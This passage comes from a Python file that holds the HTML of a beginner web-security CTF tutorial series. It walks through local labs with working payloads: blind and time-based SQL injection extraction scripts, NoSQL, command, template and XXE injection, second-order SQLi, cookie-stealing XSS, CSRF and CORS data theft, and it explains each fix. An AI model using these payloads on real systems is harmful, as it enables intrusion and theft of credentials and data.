+<pre><code class="language-bash">$ ./run.sh 13
+</code></pre>
+<p>Its endpoint answers only whether an email address is on the list:</p>
+<pre><code class="language-bash">$ h5i browser open \
+  'http://127.0.0.1:9130/api/check?email=ada@example.test' \
+  --session lab13 --new --capture
+$ h5i websec show res_0 --session lab13 --raw
+</code></pre>
+<pre><code class="language-json">{&quot;on_list&quot;: true}
+</code></pre>
+<p>When injection exists but the application does not directly print query results or database errors, it is called <strong>blind SQL injection</strong>.</p>
+<p>“Blind” does not mean that no information escapes. It means we need to identify a smaller signal and ask the database a series of questions.</p>
+<h3 id="establish-a-boolean-oracle">Establish a boolean oracle</h3>
+<p>An <strong>oracle</strong> is a behavior that answers a question about otherwise hidden data.</p>
+<p>Send two payloads that differ only in whether their predicate is true:</p>
+<pre><code class="language-bash">$ h5i websec replay req_0 --session lab13 \
+  --set &quot;query.email=zz' OR (1=1) -- &quot;
+
+$ h5i websec replay req_0 --session lab13 \
+  --set &quot;query.email=zz' OR (1=2) -- &quot;
+</code></pre>
+<p>The first response contains:</p>
+<pre><code class="language-json">{&quot;on_list&quot;: true}
+</code></pre>
+<p>The second contains:</p>
+<pre><code class="language-json">{&quot;on_list&quot;: false}
+</code></pre>
+<p>We can now replace <code>1=1</code> with a question about the hidden voucher code:</p>
+<pre><code class="language-sql">(SELECT unicode(substr(code,1,1)) FROM vouchers) &gt; 79
+</code></pre>
+<p>This asks whether the numeric value of the first character is greater than 79.</p>
+<h3 id="read-the-signal-without-fetching-every-body">Read the signal without fetching every body</h3>
+<p>The JSON response containing <code>true</code> is 17 bytes; the response containing <code>false</code> is 18. h5i includes the response size in the normal JSON output from <code>replay</code>, so a loop can branch on that number.</p>
+<p>Define a small function:</p>
+<pre><code class="language-bash">$ ask() {
+    h5i websec replay req_0 --session lab13 \
+      --reset-budget \
+      --set &quot;query.email=zz' OR ($1) -- &quot; |
+      python3 -c 'import json,sys; print(json.load(sys.stdin)[&quot;response&quot;][&quot;bytes&quot;])'
+  }
+
+$ TRUE_BYTES=$(ask &quot;1=1&quot;)
+</code></pre>
+<p><code>--reset-budget</code> matters because extracting a secret requires many requests. Without it, the session’s bounded network allowance could stop the loop partway through and make the remaining answers look false.</p>
+<h3 id="binary-search-each-character">Binary-search each character</h3>
+<p>Trying every printable character could require dozens of questions per position. A binary search halves the remaining range after every answer and needs about seven questions for a printable ASCII character.</p>
+<p>The following loop first checks the secret’s length, then extracts each character:</p>
+<pre><code class="language-bash">$ OUT=&quot;&quot;
+
+$ for i in $(seq 1 64); do
+    if [ &quot;$(ask &quot;(SELECT length(code) FROM vouchers) &lt; $i&quot;)&quot; = &quot;$TRUE_BYTES&quot; ]; then
+      break
+    fi
+
+    LO=32
+    HI=126
+
+    while [ &quot;$LO&quot; -lt &quot;$HI&quot; ]; do
+      MID=$(( (LO + HI) / 2 ))
+
+      if [ &quot;$(ask &quot;(SELECT unicode(substr(code,$i,1)) FROM vouchers) &gt; $MID&quot;)&quot; = &quot;$TRUE_BYTES&quot; ]; then
+        LO=$((MID + 1))
+      else
+        HI=$MID
+      fi
+    done
+
+    OUT=&quot;$OUT$(printf &quot;\\$(printf '%03o' &quot;$LO&quot;)&quot;)&quot;
+    printf '\r%s' &quot;$OUT&quot;
+  done
+
+$ printf '\n%s\n' &quot;$OUT&quot;
+FLAG{sqli_blind_boolean}
+</code></pre>
+<p>Each request leaks only one yes-or-no answer. Together, those answers reconstruct the entire value.</p>
+<h3 id="why-did-this-work_1">Why did this work?</h3>
+<p>The endpoint builds another query through string concatenation:</p>
+<pre><code class="language-python">sql = f&quot;SELECT 1 FROM members WHERE email = '{email}'&quot;
+found = db().execute(sql).fetchone() is not None
+return js({&quot;on_list&quot;: found})
+</code></pre>
+<p>The application hides database rows and errors, but it exposes whether the query returned a row. Hiding output reduces the bandwidth of the vulnerability; it does not remove the vulnerability.</p>
+<p>The real fix is still a parameterized query. Rate limits and detection of hundreds of near-identical requests are useful additional defenses, but they do not make concatenated SQL safe.</p>
+<h2 id="lab-14-extract-a-secret-through-time">Lab 14: extract a secret through time</h2>
+<p>Lab 14 removes even the boolean. Start it:</p>
+<pre><code class="language-bash">$ ./run.sh 14
+</code></pre>
+<p>Open the coupon endpoint:</p>
+<pre><code class="language-bash">$ h5i browser open \
+  'http://127.0.0.1:9140/api/coupon?code=SPRING10' \
+  --session lab14 --new --capture
+</code></pre>
+<p>Whatever coupon we send, the response is always:</p>
+<pre><code class="language-json">{&quot;checked&quot;: true}
+</code></pre>
+<p>The status and body do not reveal whether the database condition was true. The server can still reveal one thing unintentionally: how long the query took.</p>
+<h3 id="build-a-timing-oracle">Build a timing oracle</h3>
+<p>The lab registers a SQLite function named <code>sleep</code>. Use it only when a predicate is true:</p>
+<pre><code class="language-sql">zz' OR (
+  SELECT CASE
+    WHEN (1=1) THEN sleep(0.4)
+    ELSE 0
+  END
+  FROM staff
+  WHERE name='admin'
+) --
+</code></pre>
+<p>Calibrate the difference with repeated samples:</p>
+<pre><code class="language-bash">$ h5i websec replay req_0 --session lab14 --repeat 5 \
+  --set &quot;query.code=zz' OR (SELECT CASE WHEN (1=1) THEN sleep(0.4) ELSE 0 END FROM staff WHERE name='admin') -- &quot;
+
+$ h5i websec replay req_0 --session lab14 --repeat 5 \
+  --set &quot;query.code=zz' OR (SELECT CASE WHEN (1=2) THEN sleep(0.4) ELSE 0 END FROM staff WHERE name='admin') -- &quot;
+</code></pre>
+<p><code>--repeat 5</code> reports every sample together with the median and median absolute deviation. These are more robust than relying on one request that may be delayed by unrelated system activity.</p>
+<p>For this local lab, a threshold of 250 milliseconds cleanly separates the normal and delayed responses.</p>
+<h3 id="extract-the-six-digit-pin">Extract the six-digit PIN</h3>
+<p>Define a function that returns one timing measurement:</p>
+<pre><code class="language-bash">$ ms() {
+    h5i websec replay req_0 --session lab14 \
+      --reset-budget \
+      --set &quot;query.code=zz' OR (SELECT CASE WHEN ($1) THEN sleep(0.4) ELSE 0 END FROM staff WHERE name='admin') -- &quot; |
+      python3 -c 'import json,sys; print(json.load(sys.stdin)[&quot;samples&quot;][0][&quot;total_ms&quot;])'
+  }
+</code></pre>
+<p>Network and scheduler noise can make a fast request look slow. A sleeping server cannot answer early. We therefore trust a fast result and confirm every slow result:</p>
+<pre><code class="language-bash">$ THRESHOLD=250
+
+$ truth() {
+    [ &quot;$(ms &quot;$1&quot;)&quot; -lt &quot;$THRESHOLD&quot; ] &amp;&amp; return 1
+    [ &quot;$(ms &quot;$1&quot;)&quot; -lt &quot;$THRESHOLD&quot; ] &amp;&amp; return 1
+    return 0
+  }
+</code></pre>
+<p>The PIN contains only digits, so search character codes 48 through 57 instead of the entire printable range:</p>
+<pre><code class="language-bash">$ PIN=&quot;&quot;
+
+$ for i in $(seq 1 6); do
+    LO=48
+    HI=57
+
+    while [ &quot;$LO&quot; -lt &quot;$HI&quot; ]; do
+      MID=$(( (LO + HI) / 2 ))
+
+      if truth &quot;unicode(substr(pin,$i,1)) &gt; $MID&quot;; then
+        LO=$((MID + 1))
+      else
+        HI=$MID
+      fi
+    done
+
+    PIN=&quot;$PIN$(printf &quot;\\$(printf '%03o' &quot;$LO&quot;)&quot;)&quot;
+    printf '\r%s' &quot;$PIN&quot;
+  done
+
+$ printf '\n'
+471902
+</code></pre>
+<p>Finally, send the recovered PIN to the vault:</p>
+<pre><code class="language-bash">$ h5i websec replay req_0 --session lab14 \
+  --set path=/api/vault \
+  --unset query.code \
+  --create --set &quot;query.pin=$PIN&quot;
+</code></pre>
+<p>The response contains:</p>
+<pre><code class="language-text">FLAG{sqli_blind_time}
+</code></pre>
+<h3 id="why-did-this-work_2">Why did this work?</h3>
+<p>The vulnerable query is still simple string concatenation:</p>
+<pre><code class="language-python">db().execute(
+    f&quot;SELECT 1 FROM coupons WHERE code = '{code}'&quot;
+).fetchone()
+
+return js({&quot;checked&quot;: True})
+</code></pre>
+<p>Returning a constant body and suppressing errors do not stop the injected expression from running. They only force the attacker to use a side channel.</p>
+<p>Different database engines expose different delay functions, such as <code>SLEEP</code> in MySQL and <code>pg_sleep</code> in PostgreSQL. Statement timeouts can reduce the channel’s reliability, but parameterization is what removes the injection.</p>
+<h2 id="a-reusable-sql-injection-workflow">A reusable SQL injection workflow</h2>
+<p>These labs form one progression:</p>
+<ol>
+<li>Send a quote and look for a change in status, body size, or error behavior.</li>
+<li>Confirm control over query logic with a true and a false predicate.</li>
+<li>If rows appear in the response, determine the column shape and test a <code>UNION</code>.</li>
+<li>If only two response states remain, turn them into a boolean oracle.</li>
+<li>If the response is constant, measure whether execution time forms an oracle.</li>
+<li>Use binary search and the smallest known character range to reduce requests.</li>
+<li>Confirm impact by retrieving a specific protected value.</li>
+</ol>
+<p>The important habit is to read each probe through three signals: <strong>status, size, and time</strong>. A response does not have to print an SQL error to tell you that something changed.</p>
+<h2 id="summary">Summary</h2>
+<p>Lab 12 let us place rows from <code>api_keys</code> into a product search response with <code>UNION</code>. Lab 13 exposed only a boolean, but that one bit per request was enough to reconstruct a voucher code. Lab 14 returned an entirely constant body, yet conditional delays revealed a six-digit PIN.</p>
+<p>All three vulnerabilities had the same root cause: user input was concatenated into SQL. Error suppression and constant responses changed the exploitation technique, not the underlying bug.</p>
+<p>When finished:</p>
+<pre><code class="language-bash">$ h5i browser close --session lab12
+$ h5i browser close --session lab13
+$ h5i browser close --session lab14
+$ ./run.sh stop
+</code></pre>
+<p>In <a href="/guides/injection-beyond-sql/">Injection Beyond SQL</a>, we will continue beyond relational databases: NoSQL operator injection, shell command injection, server-side template injection, XXE, and second-order SQL injection.</p>
+<h2 id="references">References</h2>
+<ul>
+<li><a href="https://github.com/h5i-dev/h5i">h5i</a></li>
+<li><a href="https://github.com/h5i-dev/h5i-tutorial/tree/main/websec">h5i-tutorial: Web application security</a></li>
+<li><a href="https://github.com/h5i-dev/h5i-tutorial/tree/main/websec/labs/12-sqli-union">Lab 12: UNION SQL injection</a></li>
+<li><a href="https://github.com/h5i-dev/h5i-tutorial/tree/main/websec/labs/13-sqli-blind-boolean">Lab 13: Boolean-based blind SQL injection</a></li>
+<li><a href="https://github.com/h5i-dev/h5i-tutorial/tree/main/websec/labs/14-sqli-blind-time">Lab 14: Time-based blind SQL injection</a></li>
+</ul>""",
+}
+
+
+INJECTION_LABS = {
+    "section": "guides", "slug": "injection-beyond-sql", "published": "2026-09-13",
+    "eyebrow": "Tutorial 05 / Injection", "time": "6 min",
+    "tags": "NoSQL &middot; Command &middot; SSTI &middot; XXE &middot; Labs 15&ndash;19",
+    "title": "Injection Beyond SQL | h5i web security tutorial",
+    "h1": "Injection Beyond SQL",
+    "description": "A beginner-friendly CTF tutorial: cross the boundaries between JSON, shells, templates, XML, and stored data.",
+    "meta": "The same mistake in five interpreters: NoSQL operators, shell commands, server-side templates, XML entities, and stored input.",
+    "deck": "A beginner-friendly CTF tutorial: cross the boundaries between JSON, shells, templates, XML, and stored data.",
+    "next": ("/guides/browser-as-a-weapon/", "Next in the series", "The Browser as a Weapon", "Make a victim's browser execute code, send authenticated requests, cross origins, and leak an OAuth authorization code."),
+    "cta": ("Run the labs yourself", "42 deliberately vulnerable applications, one binary, no Docker and no accounts.", "https://github.com/h5i-dev/h5i-tutorial", "Open h5i-tutorial"),
+    "body": r"""<p><a href="/guides/sql-injection/">SQL Injection</a> covered SQL injection. SQL is only one interpreter that may receive attacker-controlled input. In this article, Labs 15–19 of <a href="https://github.com/h5i-dev/h5i-tutorial/tree/main/websec">h5i-tutorial</a> show the same underlying mistake in five different forms.</p>
+<p>We will use <a href="https://github.com/h5i-dev/h5i">h5i</a> to test NoSQL operators, shell commands, template expressions, XML entities, and a payload that becomes dangerous only after it is stored.</p>
+<p>These are intentionally vulnerable local applications. Only test systems you own or have permission to assess.</p>
+<h2 id="the-common-shape-of-injection">The common shape of injection</h2>
+<p>Injection happens when one system treats data as instructions for another system. The important question is not only “Which characters are blocked?” but:</p>
+<blockquote>
+<p>Which interpreter receives this value next?</p>
+</blockquote>
+<p>A JSON value may become a database operator. A search term may enter a shell command. An SVG may be parsed as XML. A string safely stored today may be concatenated into SQL tomorrow.</p>
+<h2 id="lab-15-nosql-operator-injection">Lab 15: NoSQL operator injection</h2>
+<p>Start the lab and capture the homepage:</p>
+<pre><code class="language-bash">$ ./run.sh 15
+$ h5i browser open 'http://127.0.0.1:9150/' \
+  --session lab15 --new --capture
+</code></pre>
+<p>The login endpoint expects JSON. Instead of sending a password string, send an object:</p>
+<pre><code class="language-bash">$ h5i websec replay req_0 --session lab15 --create \
+  --set method=POST --set path=/api/login \
+  --set header.Content-Type=application/json \
+  --set json.username=admin \
+  --set 'json.password={&quot;$gt&quot;:&quot;&quot;}'
+</code></pre>
+<p>The response contains <code>FLAG{nosql_operator}</code>.</p>
+<p><code>$gt</code> means “greater than” in MongoDB-style query syntax. Every nonempty password hash is greater than the empty string, so the predicate matches the admin record without knowing its password.</p>
+<p>The vulnerable code passes the request’s shape into the query:</p>
+<pre><code class="language-python">query = {
+    &quot;username&quot;: payload[&quot;username&quot;],
+    &quot;password&quot;: payload[&quot;password&quot;],
+}
+user = collection.find_one(query)
+</code></pre>
+<p>Validation must check types as well as field names. <code>password</code> must be a string, and the application should compare a password using its intended password-verification function rather than constructing a client-controlled query.</p>
+<h2 id="lab-16-command-injection-past-a-blocklist">Lab 16: command injection past a blocklist</h2>
+<p>Start the log-search lab:</p>
+<pre><code class="language-bash">$ ./run.sh 16
+$ h5i browser open \
+  'http://127.0.0.1:9160/api/logs/search?q=ERROR' \
+  --session lab16 --new --capture
+</code></pre>
+<p>The server blocks familiar shell metacharacters such as <code>&amp;&amp;</code>, <code>|</code>, backticks, and <code>$(</code>. But the query is placed inside a quoted shell command. Close the quote, add a command separated by <code>;</code>, then reopen it:</p>
+<pre><code class="language-bash">$ h5i websec replay req_0 --session lab16 \
+  --set &quot;query.q=zz'; ls; echo '&quot;
+</code></pre>
+<p>The output reveals <code>deploy.key</code>. Read it:</p>
+<pre><code class="language-bash">$ h5i websec replay req_0 --session lab16 \
+  --set &quot;query.q=zz'; cat deploy.key; echo '&quot;
+</code></pre>
+<p>The response contains <code>FLAG{command_injection}</code>.</p>
+<p>A blocklist tries to enumerate every dangerous spelling in a language designed to combine commands. It will miss alternatives.</p>
+<p>The fix is to avoid a shell:</p>
+<pre><code class="language-python">subprocess.run(
+    [&quot;grep&quot;, &quot;--fixed-strings&quot;, query, logfile],
+    capture_output=True,
+)
+</code></pre>
+<p>Passing an argument array keeps the search term as one argument rather than shell syntax. Input validation can still limit length and characters, but it should not be the boundary that prevents command execution.</p>
+<h2 id="lab-17-server-side-template-injection">Lab 17: server-side template injection</h2>
+<p>Start the postcard preview:</p>
+<pre><code class="language-bash">$ ./run.sh 17
+$ h5i browser open \
+  'http://127.0.0.1:9170/api/preview?tpl=hi' \
+  --session lab17 --new --capture
+</code></pre>
+<p>First, determine whether the template engine evaluates expressions:</p>
+<pre><code class="language-bash">$ h5i websec replay req_0 --session lab17 \
+  --set 'query.tpl={{7*7}}'
+</code></pre>
+<p>If the response contains <code>49</code>, the input is being evaluated rather than merely displayed.</p>
+<p>The lab removes obvious built-ins such as <code>open</code>, but exposes a <code>user</code> object. Python objects can lead back to the globals of the function that created them:</p>
+<pre><code class="language-bash">$ h5i websec replay req_0 --session lab17 \
+  --set 'query.tpl={{user.__init__.__globals__[&quot;VAULT_KEY&quot;]}}'
+</code></pre>
+<p>The result contains <code>FLAG{ssti_template}</code>.</p>
+<p>The mistake is allowing an untrusted user to supply the template itself:</p>
+<pre><code class="language-python">render(user_supplied_template, user=user)
+</code></pre>
+<p>Use a fixed template and pass user input only as data. A restricted environment reduces exposure but is difficult to make safe when rich application objects remain reachable.</p>
+<h2 id="lab-18-xxe-through-an-svg-upload">Lab 18: XXE through an SVG upload</h2>
+<p>SVG is an image format, but it is also XML. An XML parser may support external entities that load local files or URLs.</p>
+<p>Start the avatar lab:</p>
+<pre><code class="language-bash">$ ./run.sh 18
+$ h5i browser open 'http://127.0.0.1:9180/' \
+  --session lab18 --new --capture
+</code></pre>
+<p>The homepage prints the location of <code>service.env</code>. Create an SVG whose title expands an external entity:</p>
+<pre><code class="language-xml">&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;!DOCTYPE svg [
+  &lt;!ENTITY leak SYSTEM &quot;file:///PATH/TO/service.env&quot;&gt;
+]&gt;
+&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot;&gt;
+  &lt;title&gt;&amp;leak;&lt;/title&gt;
+&lt;/svg&gt;
+</code></pre>
+<p>Save it as <code>/tmp/avatar.svg</code>, replacing the path with the one shown by the lab. Upload the exact bytes:</p>
+<pre><code class="language-bash">$ h5i websec replay req_0 --session lab18 --create \
+  --set method=POST --set path=/api/avatar \
+  --set-file multipart.file=/tmp/avatar.svg \
+  --set multipart.file.filename=avatar.svg \
+  --set multipart.file.content_type=image/svg+xml
+</code></pre>
+<p>The parsed title contains <code>FLAG{xxe_svg_upload}</code>.</p>
+<p>This is <strong>XML external entity injection</strong>, or <strong>XXE</strong>. Disable DTD and external-entity processing for untrusted XML. For image uploads, decode and re-encode images using a format-specific image library instead of trusting their declared content type.</p>
+<h2 id="lab-19-second-order-sql-injection">Lab 19: second-order SQL injection</h2>
+<p>An input may be safe in the request that stores it and dangerous in a later operation that reuses it.</p>
+<p>Start the lab:</p>
+<pre><code class="language-bash">$ ./run.sh 19
+$ h5i browser open 'http://127.0.0.1:9190/' \
+  --session lab19 --new --capture
+</code></pre>
+<p>Register a username that contains SQL:</p>
+<pre><code class="language-bash">$ h5i websec replay req_0 --session lab19 --create \
+  --set method=POST --set path=/api/register \
+  --set header.Content-Type=application/json \
+  --set &quot;json.username=zz' OR username='admin&quot; \
+  --set json.password=pw1
+</code></pre>
+<p>Registration uses a parameterized query, so the payload is stored literally. Now ask to change that user’s password:</p>
+<pre><code class="language-bash">$ h5i websec replay req_0 --session lab19 --create \
+  --set method=POST --set path=/api/password \
+  --set header.Content-Type=application/json \
+  --set &quot;json.username=zz' OR username='admin&quot; \
+  --set json.password=pw1 \
+  --set json.new=owned
+</code></pre>
+<p>The password-change code retrieves the stored username and later concatenates it:</p>
+<pre><code class="language-python">sql = f&quot;UPDATE users SET password=? WHERE username='{stored_username}'&quot;
+</code></pre>
+<p>The stored value becomes SQL syntax and also updates the admin. Log in:</p>
+<pre><code class="language-bash">$ h5i websec replay req_0 --session lab19 --create \
+  --set method=POST --set path=/api/login \
+  --set header.Content-Type=application/json \
+  --set json.username=admin --set json.password=owned
+</code></pre>
+<p>The response contains <code>FLAG{second_order_sqli}</code>.</p>
+<p>Data does not become trusted because it came from the database. Parameterize every query at the point where it executes.</p>
+<h2 id="a-reusable-injection-method">A reusable injection method</h2>
+<p>For each input, trace its next interpreter:</p>
+<ol>
+<li>Change its type as well as its value.</li>
+<li>Use a harmless expression such as <code>{{7*7}}</code> before a dangerous payload.</li>
+<li>Compare paired inputs that should produce opposite results.</li>
+<li>Check uploaded formats for secondary parsers.</li>
+<li>Follow stored values into later reads, updates, logs, and exports.</li>
+<li>Fix the interpreter boundary: parameterized queries, argument arrays, fixed templates, and safe parsers.</li>
+</ol>
+<h2 id="summary">Summary</h2>
+<p>Labs 15–19 crossed five boundaries, but the failure was the same: untrusted data acquired the grammar of another system. The most important testing skill is recognizing that interpreter and asking what data it considers executable.</p>
+<pre><code class="language-bash">$ for s in lab15 lab16 lab17 lab18 lab19; do
+    h5i browser close --session &quot;$s&quot;
+  done
+$ ./run.sh stop
+</code></pre>
+<p>In <a href="/guides/browser-as-a-weapon/">The Browser as a Weapon</a>, the interpreter moves into the victim’s browser: reflected and stored XSS, CSRF, CORS, and OAuth redirects.</p>
+<h2 id="references">References</h2>
+<ul>
+<li><a href="https://github.com/h5i-dev/h5i">h5i</a></li>
+<li><a href="https://github.com/h5i-dev/h5i-tutorial/tree/main/websec/labs/15-nosql-operator">Lab 15: NoSQL operator injection</a></li>
+<li><a href="https://github.com/h5i-dev/h5i-tutorial/tree/main/websec/labs/16-command-injection">Lab 16: Command injection</a></li>
+<li><a href="https://github.com/h5i-dev/h5i-tutorial/tree/main/websec/labs/17-ssti-template">Lab 17: Server-side template injection</a></li>
+<li><a href="https://github.com/h5i-dev/h5i-tutorial/tree/main/websec/labs/18-xxe-svg-upload">Lab 18: XXE through SVG</a></li>
+<li><a href="https://github.com/h5i-dev/h5i-tutorial/tree/main/websec/labs/19-second-order-sqli">Lab 19: Second-order SQL injection</a></li>
+</ul>""",
+}
+
+
+BROWSERXSS = {
+    "section": "guides", "slug": "browser-as-a-weapon", "published": "2026-09-15",
+    "eyebrow": "Tutorial 06 / Browser", "time": "7 min",
+    "tags": "XSS &middot; CSRF &middot; CORS &middot; OAuth &middot; Labs 20&ndash;24",
+    "title": "The Browser as a Weapon | h5i web security tutorial",
+    "h1": "The Browser as a Weapon",
+    "description": "A beginner-friendly CTF tutorial: make a victim’s browser execute code, send authenticated requests, cross origins, and leak an OAuth authorization code.",
+    "meta": "Make a victim's browser execute code, send authenticated requests, cross origins, and leak an OAuth authorization code.",
+    "deck": "A beginner-friendly CTF tutorial: make a victim’s browser execute code, send authenticated requests, cross origins, and leak an OAuth authorization code.",
+    "next": ("/guides/ssrf-and-file-attacks/", "Next in the series", "SSRF and File Attacks", "Make a server reach internal services, bypass URL filters, preserve encoded paths, overwrite security data, and turn a log file into code."),
+    "cta": ("Run the labs yourself", "42 deliberately vulnerable applications, one binary, no Docker and no accounts.", "https://github.com/h5i-dev/h5i-tutorial", "Open h5i-tutorial"),
+    "body": r"""<p><a href="/guides/injection-beyond-sql/">Injection Beyond SQL</a> followed input into server-side interpreters. Labs 20–24 of <a href="https://github.com/h5i-dev/h5i-tutorial/tree/main/websec">h5i-tutorial</a> move the attack into a victim’s browser.</p>
+<p>The central idea is simple: we often do not need to steal a credential. If the victim’s browser already has it, we can sometimes make that browser perform the protected action for us.</p>
+<p>The labs run locally and include an automated victim browser. They require h5i to be available on <code>PATH</code>, or through <code>H5I</code>. Only use these techniques with explicit authorization.</p>
+<h2 id="lab-20-reflected-xss-past-a-filter">Lab 20: reflected XSS past a filter</h2>
+<p>Start the lab:</p>
+<pre><code class="language-bash">$ ./run.sh 20
+$ h5i browser open 'http://127.0.0.1:9200/' \
+  --session lab20 --new --capture
+</code></pre>
+<p>The search page reflects its <code>q</code> parameter but removes <code>&lt;script&gt;</code> tags. The filter performs only one replacement, so a nested tag survives its own transformation:</p>
+<pre><code class="language-text">&lt;scr&lt;script&gt;ipt&gt; ... &lt;/script&gt;
+</code></pre>
+<p>After the inner <code>&lt;script&gt;</code> is deleted, the remaining halves join into a new <code>&lt;script&gt;</code> tag.</p>
+<p>Create a unique collector ID and a payload that sends the admin cookie back:</p>
+<pre><code class="language-bash">$ ID=&quot;drop$$&quot;
+$ PAYLOAD=&quot;&lt;scr&lt;script&gt;ipt&gt;fetch('/collect?id=$ID&amp;c='+encodeURIComponent(document.cookie))&lt;/script&gt;&quot;
+</code></pre>
+<p>Confirm that the response really contains a script before asking the admin to visit it:</p>
+<pre><code class="language-bash">$ h5i websec replay req_0 --session lab20 --create \
+  --set path=/search --set &quot;query.q=$PAYLOAD&quot;
+</code></pre>
+<p>URL-encode the target and report it:</p>
+<pre><code class="language-bash">$ TARGET=&quot;http://127.0.0.1:9200/search?q=$(python3 -c \
+  'import sys,urllib.parse; print(urllib.parse.quote(sys.argv[1]))' &quot;$PAYLOAD&quot;)&quot;
+
+$ h5i websec replay req_0 --session lab20 --create \
+  --set path=/report --set &quot;query.url=$TARGET&quot;
+</code></pre>
+<p>The admin bot visits the reported URL a few seconds later. Poll the collector until its row appears:</p>
+<pre><code class="language-bash">$ h5i websec replay req_0 --session lab20 --create \
+  --set path=/collected --set &quot;query.id=$ID&quot;
+</code></pre>
+<p>The body is <code>{"rows": ["session=adm_..."]}</code>. Copy that cookie value and replay the protected request with it:</p>
+<pre><code class="language-bash">$ h5i websec replay req_0 --session lab20 --create \
+  --set path=/admin/flag \
+  --set &quot;cookie.session=PASTE_ADMIN_COOKIE&quot;
+</code></pre>
+<p>The result contains <code>FLAG{reflected_xss_filter}</code>.</p>
+<p>The fix is contextual output encoding and a well-tested HTML sanitizer—not a string replacement for one spelling of one tag. A strict Content Security Policy adds defense in depth.</p>
+<h2 id="lab-21-stored-xss-against-an-httponly-cookie">Lab 21: stored XSS against an HttpOnly cookie</h2>
+<p>Start the board lab:</p>
+<pre><code class="language-bash">$ ./run.sh 21
+$ h5i browser open 'http://127.0.0.1:9210/' \
+  --session lab21 --new --capture
+</code></pre>
+<p>The moderator’s session cookie is <code>HttpOnly</code>, so JavaScript cannot read it through <code>document.cookie</code>. That protects the cookie from direct theft, but the browser still attaches it to same-origin requests.</p>
+<p>Instead of reading the credential, ask the application for the flag and exfiltrate the response:</p>
+<pre><code class="language-bash">$ ID=&quot;drop$$&quot;
+$ PAYLOAD=&quot;&lt;script&gt;fetch('/admin/api/flag').then(r=&gt;r.text()).then(t=&gt;fetch('/collect?id=$ID&amp;c='+encodeURIComponent(t)))&lt;/script&gt;&quot;
+
+$ h5i websec replay req_0 --session lab21 --create \
+  --set method=POST --set path=/api/comment \
+  --set header.Content-Type=application/json \
+  --set json.who=anon --set &quot;json.body=$PAYLOAD&quot; \
+  --set header.X-Board-Url=http://127.0.0.1:9210/board
+</code></pre>
+<p>When the moderator reviews the stored comment, the script runs with the board’s origin and the moderator’s session. Read the collector a few seconds later:</p>
+<pre><code class="language-bash">$ h5i websec replay req_0 --session lab21 --create \
+  --set path=/collected --set &quot;query.id=$ID&quot;
+</code></pre>
+<p>The row is the percent-encoded body of <code>/admin/api/flag</code>, and it contains <code>FLAG{stored_xss_httponly}</code>.</p>
+<p><code>HttpOnly</code> is valuable, but it does not stop XSS from acting as the victim. Preventing the injection remains essential.</p>
+<h2 id="lab-22-csrf-without-seeing-the-cookie">Lab 22: CSRF without seeing the cookie</h2>
+<p><strong>Cross-site request forgery</strong>, or <strong>CSRF</strong>, makes a victim’s browser send an authenticated request from an attacker-controlled page.</p>
+<p>Start the lab:</p>
+<pre><code class="language-bash">$ ./run.sh 22
+$ h5i browser open 'http://127.0.0.1:9220/' \
+  --session lab22 --new --capture
+</code></pre>
+<p>The recovery-email endpoint changes state through <code>GET</code> and requires no CSRF token. Host an attacker page on the lab’s second origin:</p>
+<pre><code class="language-html">&lt;img src=&quot;http://127.0.0.1:9220/account/recovery-email?email=attacker@evil.example&quot;&gt;
+</code></pre>
+<p>Publish it and ask the moderator bot to open it:</p>
+<pre><code class="language-bash">$ PAGE='&lt;html&gt;&lt;body&gt;&lt;img src=&quot;http://127.0.0.1:9220/account/recovery-email?email=attacker@evil.example&quot;&gt;&lt;/body&gt;&lt;/html&gt;'
+
+$ h5i websec replay req_0 --session lab22 --create \
+  --set method=POST --set path=/page \
+  --set header.Content-Type=application/json \
+  --set json.name=trap --set &quot;json.html=$PAGE&quot;
+
+$ h5i websec replay req_0 --session lab22 --create \
+  --set method=POST --set path=/report \
+  --set header.Content-Type=application/json \
+  --set json.url=http://127.0.0.1:9221/p/trap
+</code></pre>
+<p>The browser loads the image from port 9220 and attaches the moderator’s matching cookie. Request <code>/account/reset</code> to obtain <code>FLAG{csrf_no_token}</code>.</p>
+<p>State-changing operations should not use <code>GET</code>. Require an unpredictable CSRF token and validate <code>Origin</code> or <code>Referer</code>; use <code>SameSite</code> cookies as an additional barrier.</p>
+<h2 id="lab-23-a-cors-check-that-ignores-the-port">Lab 23: a CORS check that ignores the port</h2>
+<p>An <strong>origin</strong> consists of a scheme, host, and port. These are different origins:</p>
+<pre><code class="language-text">http://127.0.0.1:9230
+http://127.0.0.1:9231
+</code></pre>
+<p>Start the lab and test both an unrelated host and the attacker-controlled second port:</p>
+<pre><code class="language-bash">$ ./run.sh 23
+$ h5i browser open 'http://127.0.0.1:9230/' \
+  --session lab23 --new --capture
+
+$ h5i websec replay req_0 --session lab23 --create \
+  --set path=/api/me \
+  --set header.Origin=http://127.0.0.1:9231
+</code></pre>
+<p>The server reflects that origin in <code>Access-Control-Allow-Origin</code> and sets <code>Access-Control-Allow-Credentials: true</code>. Its allowlist is a prefix test against <code>http://127.0.0.1</code>, so it stops reading before the port and accepts every port on the machine.</p>
+<p>Publish a page on port 9231 that reads <code>/api/me</code> with the victim’s cookies, and report it the same way as in Lab 22:</p>
+<pre><code class="language-bash">$ ID=&quot;drop$$&quot;
+$ PAGE=&quot;&lt;html&gt;&lt;body&gt;&lt;script&gt;
+fetch('http://127.0.0.1:9230/api/me',{credentials:'include'})
+  .then(r=&gt;r.text())
+  .then(t=&gt;fetch('http://127.0.0.1:9230/collect?id=$ID&amp;c='+encodeURIComponent(t)))
+&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;&quot;
+
+$ h5i websec replay req_0 --session lab23 --create \
+  --set method=POST --set path=/page \
+  --set header.Content-Type=application/json \
+  --set json.name=steal --set &quot;json.html=$PAGE&quot;
+
+$ h5i websec replay req_0 --session lab23 --create \
+  --set method=POST --set path=/report \
+  --set header.Content-Type=application/json \
+  --set json.url=http://127.0.0.1:9231/p/steal
+</code></pre>
+<p>A signed-in user opens it, the page reads the credentialed response because the server agreed to the wrong origin, and the collector receives it:</p>
+<pre><code class="language-bash">$ h5i websec replay req_0 --session lab23 --create \
+  --set path=/collected --set &quot;query.id=$ID&quot;
+</code></pre>
+<p>The row is the percent-encoded body of <code>/api/me</code>, and it contains <code>FLAG{cors_origin_check}</code>.</p>
+<p>CORS allowlists must compare parsed, normalized origins exactly. Never use prefix, suffix, substring, or hostname-only checks when credentials are allowed.</p>
